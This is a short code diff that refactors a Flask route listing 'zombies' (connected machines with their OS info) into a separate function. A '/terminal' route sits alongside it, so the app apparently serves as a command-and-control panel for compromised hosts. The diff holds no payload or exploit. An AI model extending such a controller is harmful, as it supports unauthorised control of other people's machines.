@@ -169,17 +169,8 @@ def main_web_start(use_ssl):
 
     @app_main.route('/get_zombies', methods=['GET'])
     def get_zombies_url():
-
-        if ((serverModuleVar is not None) and (serverModuleVar.connection_status)):
-            zombies_addr_and_comm_list = serverModuleVar.zombies_addresses_and_communicators_list
-            temp_list = [] # store data before sending
-            for ac in zombies_addr_and_comm_list:
-                temp_list.append( [ ac[0], ac[2]['os_info'] ] )
-
-            return jsonify(temp_list)
-
-        return 'Get Zombies Request Sent'
-
+        from main.web.functions.zombies_web import get_zombies_url_func
+        return get_zombies_url_func(serverModuleVar)
 
     @app_main.route('/terminal')
     def terminal_url():
